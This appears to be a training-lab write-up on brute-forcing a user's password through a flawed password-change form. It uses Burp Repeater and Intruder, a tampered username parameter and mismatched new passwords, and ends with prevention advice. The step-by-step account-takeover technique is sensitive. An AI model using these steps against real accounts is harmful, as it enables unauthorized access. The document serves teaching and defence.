# Lab: Password Brute-Force via Password Change

## Objective

Exploit the password change functionality to brute-force Carlos's current password, change it to a known value, then log in to his account.

---

## Vulnerability

The password change functionality contains a logic flaw.

The application verifies the **current password** before verifying whether the password confirmation matches.

Even worse, it trusts the value of:

```
username=
```

instead of using the authenticated user's identity.

This allows an authenticated user to verify another user's password.

---

## Phase 1 - Login

Login using:

```
Username:
wiener

Password:
peter
```

Open:

```
My Account
```

↓

```
Change Password
```

Capture:

```
POST /my-account/change-password
```

Send it to Burp Repeater.

---

## Phase 2 - Discover the Logic Flaw

Modify the request.

Change:

```
username=wiener
```

↓

```
username=carlos
```

Keep the correct current password for your own account:

```
current-password=peter
```

Set:

```
new-password-1=123
new-password-2=1234
```

Notice that the application only returns:

```
Passwords do not match.
```

The account is **not locked**.

This indicates that the server validates the current password before comparing the new passwords.

---

## Phase 3 - Brute Force Carlos's Password

Send the request to **Burp Intruder**.

Attack Type:

```
Sniper
```

Payload Position:

```
current-password=
```

Load the **Candidate Passwords** wordlist.

Keep:

```
username=carlos

new-password-1=123

new-password-2=1234
```

Because the new passwords do not match, no password is actually changed.

The server only checks whether the supplied current password is correct.

One request returns a different response.

Recovered password:

```
monitor
```

---

## Phase 4 - Change Carlos's Password

Return to Repeater.

Modify the request:

```
username=carlos

current-password=monitor

new-password-1=123

new-password-2=123
```

Send the request.

Carlos's password is now changed to:

```
123
```

---

## Phase 5 - Login

Login using:

```
Username:
carlos

Password:
123
```

Lab Solved ✅

---

## Why does this vulnerability exist?

The application trusts the client-supplied:

```
username
```

parameter instead of using the authenticated session.

It also validates the current password before validating the password confirmation.

This allows attackers to verify another user's password without triggering account lockout or changing the password.

---

## Prevention

- Never trust client-supplied usernames for sensitive operations.
- Always use the authenticated session identity.
- Validate authorization before validating passwords.
- Implement rate limiting and account lockout.
- Perform all validation only after verifying user ownership.

---

## Tools Used

- Burp Suite
    - Proxy
    - Repeater
    - Intruder

---

## Skills Learned

- Logic Flaw
- Password Brute Force
- Authorization Bypass
- Password Change Abuse
- Intruder (Sniper)

---

## Real World Scenario

Some applications accept a username parameter during password changes instead of using the logged-in user's identity.

Combined with incorrect validation order, attackers can brute-force another user's password and change it without knowing the original credentials.

---

## Key Takeaway

**Sensitive operations such as password changes must always use the authenticated user's identity. Never trust client-controlled username parameters, and always verify authorization before processing password validation.**
